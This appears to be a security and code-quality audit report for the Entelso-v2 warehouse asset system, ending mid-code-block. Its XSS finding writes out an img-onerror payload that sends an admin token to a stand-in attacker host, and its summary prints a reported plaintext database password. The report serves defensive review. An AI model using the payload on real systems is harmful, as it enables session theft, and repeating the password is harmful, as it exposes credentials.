# Comprehensive Technical Audit & System Health Assessment Report
# Project: Entelso-v2 (Intelligent Asset Tracking & Warehouse Management System)

**Document Version**: 2.0.0-AUDIT-FINAL  
**Date of Assessment**: 2026-08-14  
**Audit Classification**: Full-Stack Technical, Security, Infrastructure & Quality Assurance Audit  
**Assessment Team**: Forensic Architecture, Backend Security, Frontend Systems, Infrastructure, and Test Automation Teams  
**Integrity Mode**: Benchmark / Read-Only Static and Dynamic Inspection  

---

## Executive Summary & System Architecture Overview

### 1.1 Executive Summary & High-Level Health Score

An exhaustive, multi-dimensional code audit and infrastructure inspection was conducted across the **Entelso-v2** asset management ecosystem. Entelso-v2 is an enterprise operational platform designed for tracking high-value telecommunications test equipment, optical instruments, safety gear, and vehicles, operating across field engineering teams, central warehouses, and automated WhatsApp/n8n ingestion pipelines.

The audit evaluated five core dimensions:
1. **Backend Application Layer (`backend/`)**: Security posture, RBAC enforcement, database integrity, business logic correctness, and API reliability.
2. **Frontend User Interface (`dashboard/`)**: Client-side execution safety, XSS exposure, DOM rendering performance, state management, accessibility, and localization.
3. **Configurations, Dependencies & Infrastructure**: Secret hygiene, network policies, TLS enforcement, containerization, supply chain integrity, and CI/CD automation.
4. **Automated Testing & Code Coverage**: Test harness execution, assertion fidelity, coverage metrics, and test pyramid architecture.
5. **Architectural Cohesion & Maintainability**: Modularity, separation of concerns, and technical debt.

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                             SYSTEM HEALTH SCORECARD                              │
├───────────────────────────────┬─────────────────┬────────────────────────────────┤
│ Dimension                     │ Score (0 - 100) │ Status                         │
├───────────────────────────────┼─────────────────┼────────────────────────────────┤
│ Backend Security & Auth       │ 38 / 100        │ ❌ Critical Vulnerabilities    │
│ Backend Logic & Reliability   │ 52 / 100        │ ⚠️ Severe Logic Bugs           │
│ Frontend Execution & UX       │ 44 / 100        │ ❌ Broken Core Features & XSS  │
│ Infrastructure & Secrets      │ 28 / 100        │ ❌ Active Leaks & Exposed RLS  │
│ Test Coverage & Automation    │ 12 / 100        │ ❌ Inverted Pyramid (3.8% LOC) │
│ Architectural Modularity      │ 40 / 100        │ ⚠️ Monolithic Anti-Patterns   │
├───────────────────────────────┼─────────────────┼────────────────────────────────┤
│ OVERALL COMPOSITE HEALTH      │ 35.7 / 100      │ ❌ CRITICAL REMEDIATION NEEDED │
└───────────────────────────────┴─────────────────┴────────────────────────────────┘
```

#### Consolidated Vulnerability & Defect Severity Count
- **Critical Severity (P0)**: **15 Findings** (Immediate operational, data loss, or exploit risks)
- **High Severity (P1)**: **24 Findings** (Major security breaches, broken workflows, massive performance degradation)
- **Medium Severity (P2)**: **23 Findings** (Memory leaks, race conditions, contrast failures, missing limits)
- **Low / Informational (P3)**: **9 Findings** (Code cleanliness, dead imports, minor style defects)
- **Total Cataloged Issues**: **71 Issues**

#### Key Executive Takeaways
1. **Exposed Administrative Credentials in Version Control**: Production Supabase PostgreSQL connection strings containing plaintext passwords (`jEGWYp4b9ybXSq5p`), active Supabase `service_role` administrative keys, and static API keys were found committed in plain text across `.env`, `.env.example`, and n8n workflow export JSON files.
2. **Fatal Database Connection Pool Transaction Flaw**: Multiple core services invoke `pool.query('BEGIN')` using a pooled connection interface. Each statement borrows a distinct client from the connection pool, rendering database transactions non-atomic, disabling rollbacks upon error, and polluting the pool with orphaned transaction states.
3. **Broken Core Frontend Functionalities**: Crucial business workflows in the production dashboard are currently non-functional due to JavaScript runtime errors: Kit management fails due to checking `if (res.success)` directly on a fetch `Response` object; Zone creation crashes due to calling an undeclared `showToast()` function; and Bulk QR code export prints `"undefined"` labels and generates corrupt URLs.
4. **Widespread Cross-Site Scripting (XSS) & Token Hijacking**: User profiles, team names, category labels, movement history, and print popups inject untrusted data directly into `.innerHTML` and `document.write()`. Because JWT tokens are permanently mirrored into `localStorage`, any authenticated or unauthenticated attacker who injects a payload into team or user names can achieve persistent, automated administrator account takeover.
5. **Severe Deficit in Test Automation (3.80% Total Coverage)**: The codebase lacks a standard test framework (no Jest, Vitest, or Mocha). The backend service layer is 0% unit tested; the frontend is 100% untested; and the existing ad-hoc test suite fails 24 out of 93 assertions due to widespread RBAC route misconfigurations.

---

### 1.2 System Architecture & Technology Stack

The Entelso-v2 platform implements a hybrid client-server and event-driven architecture designed to bridge field technicians, central warehouse supervisors, and administrative personnel.

```
                                    ENTELSO-V2 SYSTEM ARCHITECTURE TOPOLOGY
                                    
   ┌───────────────────────────┐         ┌──────────────────────────┐         ┌───────────────────────────┐
   │    Field Technicians      │         │   Warehouse / Admins     │         │   Automated Webhooks      │
   │  (WhatsApp Mobile Client) │         │   (Web Dashboard SPA)    │         │ (n8n / Gemini AI Ingest)  │
   └─────────────┬─────────────┘         └────────────┬─────────────┘         └─────────────┬─────────────┘
                 │                                    │                                     │
                 │ Twilio / Meta API                  │ HTTPS / JSON REST                   │ HTTP / Secret Header
                 ▼                                    ▼                                     ▼
   ┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
   │                                  REVERSE PROXY & GATEWAY (Nginx / Docker)                            │
   │                                      [Port 80 / 443 -> Reverse Proxy]                                │
   └──────────────────────────────────────────────────┬───────────────────────────────────────────────────┘
                                                      │
                                                      ▼
   ┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
   │                                 APPLICATION SERVER (Node.js / Express)                               │
   │                                                                                                      │
   │  ┌─────────────────────────┐  ┌─────────────────────────┐  ┌──────────────────────────────────────┐  │
   │  │   Auth & Security       │  │   Domain Services       │  │   Async Processing & Storage         │  │
   │  │   - JWT Verification    │  │   - Activos / Kits      │  │   - Multer (In-Memory Buffer)        │  │
   │  │   - Rate Limiting (RAM) │  │   - Items / Categorías  │  │   - Supabase Storage Client          │  │
   │  │   - RBAC Middleware     │  │   - Movimientos / Hist. │  │   - QR Code Generator                │  │
   │  │   - Helmet / CORS       │  │   - Mantenimiento / TAG │  │   - XLSX Bulk Import Engine          │  │
   │  └─────────────────────────┘  └─────────────────────────┘  └──────────────────────────────────────┘  │
   └──────────────────────────────────────────────────┬───────────────────────────────────────────────────┘
                                                      │
                                                      ▼
   ┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
   │                              PERSISTENCE & CLOUD DATA LAYER (Supabase)                               │
   │                                                                                                      │
   │  ┌─────────────────────────────────────────────────┐  ┌───────────────────────────────────────────┐  │
   │  │ PostgreSQL 15+ (Database & Relational Model)     │  │ Supabase Storage (Object Buckets)         │  │
   │  │ - Transaccional: activos, movimientos, usuarios │  │ - Bucket: equipos (Asset & Ticket Photos)  │  │
   │  │ - Catálogo: items, categorías, ubicaciones      │  │ - Bucket: avatars (User Profile Photos)    │  │
   │  └─────────────────────────────────────────────────┘  └───────────────────────────────────────────┘  │
   └──────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

#### Technology Stack Summary Table

| Layer | Technologies / Libraries | Declared Versions | Observed Deployment / Runtime |
|---|---|---|---|
| **Backend Runtime** | Node.js, Express.js | `express@^4.19.2`, `node:22-alpine` | Single-process Node.js runtime |
| **Database & ORM** | PostgreSQL, `pg` (node-postgres) | `pg@^8.22.0` | Supabase Cloud Pooler (Port 5432) |
| **Authentication** | JWT, bcrypt, otplib | `jsonwebtoken@^9.0.2`, `bcrypt@^5.1.1`, `otplib@^12.0.1` | Bearer Token + 4-digit PIN |
| **Data Validation** | Zod | `zod@^3.23.8` | Express middleware validation |
| **File Handling** | Multer, SheetJS (xlsx) | `multer@^2.2.0`, `xlsx@^0.18.5` | In-memory RAM buffer processing |
| **Logging & Security** | Pino (unused), Morgan, Helmet, CORS | `pino@^9.1.0`, `helmet@^7.1.0`, `cors@^2.8.5` | Synchronous `console.log` wrapper |
| **Frontend UI** | HTML5, Vanilla JavaScript (ES6+), CSS3 | Monolithic `script.js` (4,196 lines) | Single Page Application (SPA) |
| **Frontend Vendors** | Chart.js, Flatpickr, FontAwesome, XLSX-Style | External unpinned CDNs (jsdelivr, cdnjs) | Synchronous `<head>` script tags |
| **Containerization** | Docker, Docker Compose, Nginx Alpine | `nginx:alpine`, `node:22-alpine` | Multi-container composition |
| **Automation** | n8n Workflow Automation, Google Gemini AI | Community n8n workflows | Webhook ingestion pipeline |

---

## Differentiated Section 1: Backend Codebase Audit (`backend/`)

### 2.1 Backend Security Vulnerabilities

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                               BACKEND SECURITY VULNERABILITY MATRIX                                    │
├─────────┬─────────────────────────────────────────────────────────────────┬──────────┬─────────────────┤
│ ID      │ Vulnerability Description                                       │ Severity │ Target Location │
├─────────┼─────────────────────────────────────────────────────────────────┼──────────┼─────────────────┤
│ SEC-B01 │ Broken RBAC Authorization on `/api/usuarios` (GET Leakage)      │ Critical │ `usuarios.routes.js:7-10`
│ SEC-B02 │ Completely Unauthenticated Public File Upload (`/api/upload`)   │ Critical │ `upload.routes.js:13-45`
│ SEC-B03 │ Over-Restrictive Asset Permissions Blocking Warehouse Role      │ High     │ `activos.routes.js:16-19`
│ SEC-B04 │ Missing Authorization on Items, Locations & Audit Endpoints     │ High     │ `items`, `ubicaciones`, `audit`
│ SEC-B05 │ 2FA Login Flow Bypass & Plaintext Secret Storage               │ High     │ `auth.service.js:10-67, 138`
│ SEC-B06 │ Timing Attack Vulnerability on API Key Authentication Header   │ Medium   │ `auth.middleware.js:12`
│ SEC-B07 │ Weak JWT Secret Length Validation & Missing Revocation Model    │ Medium   │ `environment.js:9`, `auth.service.js`
└─────────┴─────────────────────────────────────────────────────────────────┴──────────┴─────────────────┘
```

#### Detailed Security Vulnerability Analysis

##### [SEC-B01] Broken RBAC Authorization on `/api/usuarios` (Data Leakage)
- **Location**: `backend/src/modules/usuarios/usuarios.routes.js` (lines 7–10)
- **Vulnerability**: 
  ```javascript
  router.get('/',             requireAuth, ctrl.getAll);
  router.delete('/bulk/others', requireAuth, requireAdmin, ctrl.removeAllOthers);
  router.get('/:id',          requireAuth, ctrl.getById);
  router.get('/:id/activos',  requireAuth, ctrl.getAssets);
  ```
- **Technical Impact**: The routes `GET /api/usuarios`, `GET /api/usuarios/:id`, and `GET /api/usuarios/:id/activos` require only `requireAuth` without verifying user roles. Any authenticated user holding a valid JWT with role `trabajador` (field worker) or `almacen` (warehouse) can query the complete directory of employees, extracting full names, personal email addresses, mobile WhatsApp phone numbers, assigned equipment, and password metadata. This directly violates Requirement R2 and fails the automated test suite.

##### [SEC-B02] Completely Unauthenticated Public File Upload (`/api/upload`)
- **Location**: `backend/src/modules/upload/upload.routes.js` (lines 13–45)
- **Vulnerability**:
  ```javascript
  const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 5 * 1024 * 1024 },
  });
  router.post('/', upload.single('foto'), async (req, reply, next) => { ... });
  router.post('/batch', upload.array('fotos', 5), async (req, reply, next) => { ... });
  ```
- **Technical Impact**: Neither `POST /api/upload` nor `POST /api/upload/batch` mounts `requireAuth`. Any unauthenticated actor on the public internet can upload arbitrary binary payloads directly to Supabase cloud storage using the backend's administrative service role key. Furthermore, the multer configuration lacks a `fileFilter` MIME-type validation, allowing the upload of executable scripts (`.php`, `.exe`, `.html`, `.svg`), creating malware hosting and Stored XSS attack vectors.

##### [SEC-B03] Over-Restrictive Asset Permissions Blocking Warehouse Role
- **Location**: `backend/src/modules/activos/activos.routes.js` (lines 16–19)
- **Vulnerability**:
  ```javascript
  router.post('/',               requireAuth, requireAdmin, validate(createAssetSchema), ctrl.create);
  router.post('/bulk',          requireAuth, requireAdmin, validate(bulkCreateAssetSchema), ctrl.bulkCreate);
  router.patch('/:id',           requireAuth, requireAdmin, validate(updateAssetSchema), ctrl.update);
  router.delete('/:id',          requireAuth, requireAdmin, ctrl.remove);
  ```
- **Technical Impact**: The backend only provides a binary `requireAdmin` check. The `almacen` (warehouse operator) role is explicitly tasked with inventory ingestion, asset registration, and tool assignments, but receives HTTP 403 Forbidden on all asset mutation endpoints.

##### [SEC-B04] Missing Authorization on Items, Locations & Audit Endpoints
- **Locations**: `backend/src/modules/items/items.routes.js` (lines 10–13), `backend/src/modules/ubicaciones/ubicaciones.routes.js` (lines 10–12), `backend/src/modules/audit/audit.routes.js` (lines 7–9)
- **Technical Impact**:
  - `POST /api/items`, `PUT /api/items/:id`, `PATCH /api/items/:id/stock`, and `DELETE /api/items/:id` have only `requireAuth`. Any field worker can wipe item categories or manipulate global stock levels.
  - `POST /api/ubicaciones`, `PUT /api/ubicaciones/:id`, `DELETE /api/ubicaciones/:id` only enforce `requireAuth`, enabling non-admin users to alter physical warehouse locations.
  - `GET /api/audit` and `POST /api/audit` only enforce `requireAuth`, enabling low-privilege users to read system security logs and inject forged audit log records.

##### [SEC-B05] 2FA Login Flow Bypass & Plaintext Secret Storage
- **Location**: `backend/src/modules/auth/auth.service.js` (lines 10–67, 138, 157)
- **Technical Impact**: 
  1. `setup2FA` stores the TOTP secret key unencrypted in `usuarios.secret_2fa` (`UPDATE usuarios SET secret_2fa = $1 WHERE id = $2`), leaving TOTP seeds exposed to anyone with read access to the database.
  2. The `login()` method (lines 10–67) validates user credentials and immediately issues a full-access JWT without checking if `is_2fa_enabled` is `true`. Even if a user configures Two-Factor Authentication, the login endpoint completely ignores 2FA verification.

##### [SEC-B06] Timing Attack Vulnerability on API Key Authentication Header
- **Location**: `backend/src/common/middleware/auth.middleware.js` (lines 10–12)
- **Vulnerability**:
  ```javascript
  const key = req.headers['x-api-key'] || req.headers['x-ingest-secret'];
  if (!key) return reply.status(401).json(res.error('Clave de API no provista.', 'UNAUTHORIZED'));
  if (key !== env.API_KEY) return reply.status(403).json(res.error('Clave de API inválida.', 'FORBIDDEN'));
  ```
- **Technical Impact**: Standard JavaScript string inequality (`key !== env.API_KEY`) terminates evaluation at the first non-matching character. An attacker can measure execution latency differences over thousands of requests to iteratively reconstruct the secret `API_KEY` byte-by-byte.

---

### 2.2 Backend Bugs, Logic Flaws & Edge Cases

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   BACKEND LOGIC FLAWS & BUGS MATRIX                                    │
├─────────┬─────────────────────────────────────────────────────────────────┬──────────┬─────────────────┤
│ ID      │ Bug / Logic Defect Description                                  │ Severity │ Target Location │
├─────────┼─────────────────────────────────────────────────────────────────┼──────────┼─────────────────┤
│ BUG-B01 │ Fatal Connection Pool Transaction Flaw (`pool.query('BEGIN')`)  │ Critical │ `mantenimientos`, `whatsapp`
│ BUG-B02 │ Unhandled Promise Rejection in Express 4 Async Login Handler    │ High     │ `auth.controller.js:26`
│ BUG-B03 │ Auth Context Mismatch (`req.user.id` vs `req.user.sub`)         │ Medium   │ `usuarios.controller.js:39`
│ BUG-B04 │ Race Condition in Asset Auto-Serial Number Generation           │ Medium   │ `activos.service.js:28-51`
│ BUG-B05 │ Consumable Stock Race Condition & Negative Inventory Balance    │ Medium   │ `items.service.js:35-47`
│ BUG-B06 │ Uncaught TypeError on Optional `zona` in WhatsApp Ingest       │ Medium   │ `ingest.service.js:87`
│ BUG-B07 │ Non-Standard HTTP 200 OK Returned for Business Errors           │ Low      │ `whatsapp.controller.js`
│ BUG-B08 │ Broken Standalone Migration Script Path Resolution              │ Low      │ `run_migration.js:3`
└─────────┴─────────────────────────────────────────────────────────────────┴──────────┴─────────────────┘
```

#### Detailed Bug Analysis

##### [BUG-B01] Fatal Database Connection Pool Transaction Flaw (False Transactions)
- **Locations**: `backend/src/modules/mantenimientos/mantenimientos.service.js` (lines 19–34), `backend/src/modules/whatsapp/whatsapp.service.js` (lines 77, 102, 105, 115, 128, 131, 175, 182, 185)
- **Code Extract**:
  ```javascript
  // mantenimientos.service.js
  await db.query('BEGIN');
  try {
      const { rows } = await db.query(`INSERT INTO mantenimientos ...`, [...]);
      await db.query(`UPDATE activos SET estado = 'en_mantenimiento' WHERE id = $1`, [activo_id]);
      await db.query('COMMIT');
  } catch (err) {
      await db.query('ROLLBACK');
      throw err;
  }
  ```
- **Root Cause & Impact**: `db.query` delegates directly to `pool.query()`. The node-postgres connection pool acquires an arbitrary connection from the pool, executes the single SQL query string, and immediately releases the client back to the pool. 
  - The `BEGIN` statement runs on Connection A.
  - The `INSERT` runs on Connection B.
  - The `UPDATE` runs on Connection C.
  - The `COMMIT` runs on Connection D.
  Consequently, all statements execute in default autocommit mode without transaction isolation. If an error occurs on statement 2, `ROLLBACK` executes on Connection E (which has no active transaction), leaving modified records permanently written and corrupting connection states inside the pool.

##### [BUG-B02] Unhandled Promise Rejection in Express 4 Async Login Handler
- **Location**: `backend/src/modules/auth/auth.controller.js` (lines 8–27)
- **Code Extract**:
  ```javascript
  exports.login = async (req, reply) => {
    try {
      // ... authentication logic ...
    } catch (err) {
      if (err.isOperational) {
        return reply.status(err.statusCode ?? 401).json(res.error(err.message, 'AUTH_ERROR'));
      }
      throw err; // Intended for global error handler
    }
  };
  ```
- **Root Cause & Impact**: Express 4 does not catch errors thrown inside asynchronous (`async/await`) route handlers unless they are wrapped in an async error wrapper or explicitly passed via `next(err)`. A non-operational error (e.g. database timeout) triggers an `UnhandledPromiseRejection`, causing the client HTTP request to hang until timeout and potentially crashing the Node.js runtime process.

##### [BUG-B03] Auth Context Mismatch Causing `removeAllOthers` Failure
- **Location**: `backend/src/modules/usuarios/usuarios.controller.js` (line 39)
- **Code Extract**:
  ```javascript
  exports.removeAllOthers = async (req, reply, next) => {
    try {
      await svc.removeAllOthers(req.user.id);
      reply.json(res.success({ deleted: true, kept: req.user.id }));
    } catch (e) { next(e); }
  };
  ```
- **Root Cause & Impact**: In `backend/src/common/middleware/auth.middleware.js` (line 30), the decoded JWT payload is attached to `req.user`. Standard JWT claims store the user ID in `sub` (`req.user.sub`), meaning `req.user.id` is `undefined`. When invoking `svc.removeAllOthers(undefined)`, the query `DELETE FROM usuarios WHERE id != $1` executes with `[undefined]`, triggering a PostgreSQL syntax/type error.

##### [BUG-B04] Race Condition in Auto-Serial Generation
- **Location**: `backend/src/modules/activos/activos.service.js` (lines 28–51)
- **Root Cause & Impact**: `generateAutoId(categoria)` selects all existing serial numbers matching a prefix (`SELECT numero_serie FROM activos WHERE numero_serie LIKE $1`), iterates in JavaScript memory to find `maxNum`, and calculates `seq = maxNum + 1`. Under concurrent creation requests, multiple threads calculate the exact same sequence number, causing database primary key collisions or silent record overwrites.

##### [BUG-B06] Uncaught TypeError on Optional `zona` in WhatsApp Ingest
- **Location**: `backend/src/modules/ingest/ingest.service.js` (line 87)
- **Code Extract**:
  ```javascript
  const locId = await buscarOCrear(
    client, 'ubicaciones', 'nombre_ubicacion', zona,
    { nombre_ubicacion: zona.trim(), descripcion: `Auto-creada por reporte WhatsApp (${zona})` }
  );
  ```
- **Root Cause & Impact**: `ingest.validation.js` marks `zona` as `z.string().optional()`. When an incoming payload omits the `zona` parameter, `zona.trim()` throws an uncaught `TypeError: Cannot read properties of undefined (reading 'trim')`, returning HTTP 500 to the webhook caller.

---

### 2.3 Backend Performance Bottlenecks & Missing Indexes

1. **Massive N+1 Database Query Pattern in `bulkCreate` (`activos.service.js:280-379`)**:
   - For an uploaded spreadsheet with 500 rows, `bulkCreate` executes up to 7 separate sequential SQL queries per item (`SELECT items`, `INSERT items`, `SELECT ubicaciones`, `INSERT ubicaciones`, `SELECT items for categoria`, `generateAutoId` with `SELECT LIKE`, and `INSERT INTO activos ON CONFLICT`).
   - This generates **~3,500 round-trips** inside a single database transaction, holding the pool connection open for 10–25 seconds and starving all concurrent API requests.
2. **Unindexed Regex Scan on Phone Number Lookups (`whatsapp.service.js:16-17`)**:
   - `SELECT id, nombre, pin_hash FROM usuarios WHERE regexp_replace(telefono_whatsapp, '\\D', '', 'g') LIKE $1 LIMIT 1`
   - Using `regexp_replace` inside the `WHERE` clause invalidates B-Tree indexes on `telefono_whatsapp`, forcing a full table sequential scan on every incoming message.
3. **Synchronous JSON Logging & Event Loop Blocking (`logger.js:5-7`, `whatsapp.service.js:150`)**:
   - `logger.js` uses synchronous `console.log(JSON.stringify(...))` to stdout.
   - `Buffer.from(base64Data, 'base64')` parses file buffers up to 50MB synchronously on the main JavaScript event loop thread, freezing the server for several hundred milliseconds.
4. **Missing Critical Foreign Key Indexes**:
   - Missing indexes on high-frequency filter columns: `activos(item_id)`, `activos(usuario_actual_id)`, `activos(ubicacion_actual_id)`, `activos(estado)`, `activos(team)`, `movimientos(activo_id)`, `movimientos(usuario_id)`, `movimientos(fecha_movimiento)`, `mantenimientos(activo_id)`, and `audit_logs(usuario_id)`.

---

### 2.4 Concrete Backend Remediation Code Proposals

#### 1. Implement Role-Based Access Control Middleware (`hasRole`)
```javascript
// backend/src/common/middleware/auth.middleware.js
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const env = require('../../config/environment');
const res = require('../utils/apiResponse');

const requireAuth = (req, reply, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return reply.status(401).json(res.error('Token no provisto.', 'UNAUTHORIZED'));
  }
  const token = authHeader.split(' ')[1];
  try {
    const payload = jwt.verify(token, env.JWT_SECRET, { algorithms: ['HS256'] });
    req.user = payload;
    req.userId = payload.sub || payload.id;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return reply.status(401).json(res.error('El token ha expirado.', 'TOKEN_EXPIRED'));
    }
    return reply.status(401).json(res.error('Token inválido.', 'INVALID_TOKEN'));
  }
};

const hasRole = (...allowedRoles) => (req, reply, next) => {
  if (!req.user || !allowedRoles.includes(req.user.rol)) {
    return reply.status(403).json(res.error('Acceso denegado. Permisos insuficientes.', 'FORBIDDEN'));
  }
  next();
};

const requireAdmin = hasRole('admin');

const requireApiKey = (req, reply, next) => {
  const key = req.headers['x-api-key'] || req.headers['x-ingest-secret'];
  if (!key) {
    return reply.status(401).json(res.error('Clave de API no provista.', 'UNAUTHORIZED'));
  }
  const expectedKey = env.API_KEY;
  const keyBuf = Buffer.from(String(key));
  const expectedBuf = Buffer.from(String(expectedKey));
  
  if (keyBuf.length !== expectedBuf.length || !crypto.timingSafeEqual(keyBuf, expectedBuf)) {
    return reply.status(403).json(res.error('Clave de API inválida.', 'FORBIDDEN'));
  }
  next();
};

module.exports = { requireAuth, hasRole, requireAdmin, requireApiKey };
```

#### 2. Fix Transaction Connection Pool Management
```javascript
// backend/src/modules/mantenimientos/mantenimientos.service.js
const db = require('../../config/database');

exports.createMantenimiento = async (data) => {
  const client = await db.pool.connect();
  try {
    await client.query('BEGIN');
    
    const { rows } = await client.query(
      `INSERT INTO mantenimientos (activo_id, descripcion_problema, estado, reportado_por_id)
       VALUES ($1, $2, $3, $4) RETURNING *`,
      [data.activo_id, data.descripcion, 'pendiente', data.usuario_id]
    );
    
    await client.query(
      `UPDATE activos SET estado = 'en_mantenimiento' WHERE id = $1`,
      [data.activo_id]
    );
    
    await client.query('COMMIT');
    return rows[0];
  } catch (err) {
    await client.query('ROLLBACK');
    throw err;
  } finally {
    client.release();
  }
};
```

#### 3. Secure File Upload Endpoints with Strict MIME Filters
```javascript
// backend/src/modules/upload/upload.routes.js
const { Router } = require('express');
const multer = require('multer');
const { requireAuth } = require('../../common/middleware/auth.middleware');
const storageSvc = require('../storage/storage.service');
const res = require('../../common/utils/apiResponse');

const router = Router();
const ALLOWED_MIME_TYPES = ['image/jpeg', 'image/png', 'image/webp'];

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max
  fileFilter: (req, file, cb) => {
    if (ALLOWED_MIME_TYPES.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Tipo de archivo no permitido. Solo se aceptan JPEG, PNG y WebP.'));
    }
  },
});

router.post('/', requireAuth, upload.single('foto'), async (req, reply, next) => {
  try {
    if (!req.file) return reply.status(400).json(res.error('No se envió ningún archivo.', 'VALIDATION_ERROR'));
    const url = await storageSvc.uploadFile(req.file.buffer, req.file.mimetype, 'equipos');
    return reply.json(res.success({ url }));
  } catch (err) { next(err); }
});

module.exports = router;
```

---

## Differentiated Section 2: Frontend Codebase Audit (`dashboard/`)

### 3.1 Critical Production Bugs

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   FRONTEND CRITICAL BUGS MATRIX                                        │
├─────────┬─────────────────────────────────────────────────────────────────┬──────────┬─────────────────┤
│ ID      │ Bug Description                                                 │ Severity │ Target Location │
├─────────┼─────────────────────────────────────────────────────────────────┼──────────┼─────────────────┤
│ BUG-F01 │ Kit Management Broken (`if (res.success)` on `Response` object) │ Critical │ `script.js:4152-4187`
│ BUG-F02 │ Runtime Crash on Zone Create/Delete (`showToast` not defined)   │ Critical │ `script.js:3636-3658`
│ BUG-F03 │ Missing Bulk Delete Post-Action Callbacks (`window.loadInventory`)│ Critical │ `script.js:3547-3549`
│ BUG-F04 │ Broken Bulk QR Label Export (Renders `"undefined"` / Bad URLs)  │ Critical │ `script.js:3695-3726`
│ BUG-F05 │ Inconsistent Destination WhatsApp Phone Numbers                 │ Medium   │ `script.js:1633, 3718`
│ BUG-F06 │ Stale Background Polling Storm on HTTP 401 Session Expiry       │ Medium   │ `script.js:98-130`
└─────────┴─────────────────────────────────────────────────────────────────┴──────────┴─────────────────┘
```

#### Detailed Frontend Bug Analysis

##### [BUG-F01] Kit Management Broken (`if (res.success)` on `Response` object)
- **Location**: `dashboard/script.js` (lines 4152–4166, 4173–4187)
- **Bug Analysis**:
  ```javascript
  const res = await apiFetch('/api/activos/' + child.id, {
    method: 'PATCH',
    body: JSON.stringify({ parent_activo_id: kitId })
  });
  if (res.success) { // ERROR: res is a Fetch Response object!
    registrarAuditLog(`Added asset ${child.id} to kit ${kitId}`);
    await cargarActivos(true);
    window.renderKitContents(kitId);
  } else {
    alert(res.message); // Displays "undefined" alert popup!
  }
  ```
- **Impact**: In native JavaScript `fetch` wrappers, `res` is a `Response` instance. The property `res.success` is always `undefined`. As a result, adding or removing assets to/from a WalkTest kit always branches to the failure block, popping up an `alert(undefined)` dialog despite the backend successfully saving the relationship.

##### [BUG-F02] Runtime Crash on Zone Create/Delete (`showToast` not defined)
- **Location**: `dashboard/script.js` (lines 3636, 3638, 3641, 3653, 3655, 3658)
- **Bug Analysis**:
  ```javascript
  if (json.success) {
      input.value = '';
      await loadZonas();
      showToast(window.i18n.t('zonas.toast_creada') || 'Zone created successfully');
  }
  ```
- **Impact**: `showToast()` is called directly across multiple zone mutation handlers but is never declared in `script.js`, `i18n.js`, or `index.html`. Any attempt to create or delete a physical zone throws `Uncaught ReferenceError: showToast is not defined`, crashing the script thread and leaving the user without feedback.

##### [BUG-F03] Missing Bulk Delete Callbacks (`window.loadInventory`, `window.loadUsuarios`)
- **Location**: `dashboard/script.js` (lines 3547–3549)
- **Impact**: After performing a bulk delete operation, the code checks `if (window.loadInventory) await window.loadInventory();`. The actual functions in the codebase are named `cargarActivos()` and `cargarUsuarios()`. Because the expected callback properties are undefined on `window`, the data tables fail to refresh, giving users the false impression that items were not deleted.

##### [BUG-F04] Broken Bulk QR Label Export Printing `"undefined"`
- **Location**: `dashboard/script.js` (lines 3695, 3719, 3725, 3726)
- **Bug Analysis**:
  ```javascript
  const itemsToExport = inventoryData.filter(item => checked.includes(item.db_id));
  const qrPayload = `https://wa.me/${waNumber}?text=${encodeURIComponent('INFO ' + item.numero_serie)}`;
  // ...
  <div class="label-id">${item.numero_serie}</div>
  <div class="label-name">${item.nombre_item}</div>
  ```
- **Impact**: `inventoryData` models contain mapped frontend properties `item.id`, `item.serie`, and `item.equipo`. The raw SQL properties `item.numero_serie` and `item.nombre_item` do not exist on these objects. The resulting printable label sheets render `"undefined"` for both ID and Name, and the generated QR codes point to broken URLs (`INFO%20undefined`).

---

### 3.2 Frontend Security Vulnerabilities

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                  FRONTEND SECURITY VULNERABILITY MATRIX                                │
├─────────┬─────────────────────────────────────────────────────────────────┬──────────┬─────────────────┤
│ ID      │ Vulnerability Description                                       │ Severity │ Target Location │
├─────────┼─────────────────────────────────────────────────────────────────┼──────────┼─────────────────┤
│ SEC-F01 │ Stored & DOM Cross-Site Scripting (XSS) in Table & List Views   │ High     │ `script.js:1443, 3472, 3889`
│ SEC-F02 │ DOM XSS via `document.write` in Popup Print Windows             │ High     │ `script.js:1831, 3738`
│ SEC-F03 │ Modal Dialog HTML Injection in `customAlert` & `customConfirm`  │ High     │ `script.js:3987, 4019`
│ SEC-F04 │ Insecure Token Storage & Cross-Tab Permanent Mirroring          │ High     │ `script.js:47-69`
│ SEC-F05 │ Complete Absence of Client-Side RBAC UI Enclosures              │ High     │ `script.js:246-260`
│ SEC-F06 │ Data Leakage via Unauthenticated Third-Party QR Server          │ Medium   │ `script.js:1637, 3720`
└─────────┴─────────────────────────────────────────────────────────────────┴──────────┴─────────────────┘
```

#### Detailed Frontend Security Analysis

##### [SEC-F01] Stored & DOM Cross-Site Scripting (XSS) via Unsanitized `innerHTML`
- **Locations**:
  - `dashboard/script.js:3472-3478` (Team Management): `<span>${t.nombre}</span>` interpolated without escaping.
  - `dashboard/script.js:3889-3914` (Category Management): `<strong>${c.nombre}</strong>` and `value="${c.nombre}"` unescaped.
  - `dashboard/script.js:1443-1454` (User Management Table): `<td>${u.nombre}</td>` and `<td>${u.email}</td>` unescaped.
  - `dashboard/script.js:1788-1797` (Timeline History): `mov.nombre_usuario`, `mov.ubicacion_origen`, `mov.ubicacion_destino` unescaped.
- **Exploitation Scenario**: An attacker enters `<img src=x onerror="fetch('https://attacker.com/?c='+localStorage.getItem('entelso_token'))">` as their user name or team name. Whenever an administrator views the team list, user table, or equipment history, the script executes automatically, exfiltrating administrative tokens.

##### [SEC-F04] Insecure Token Storage & Permanent `localStorage` Mirroring
- **Location**: `dashboard/script.js` (lines 47–69)
- **Analysis**:
  ```javascript
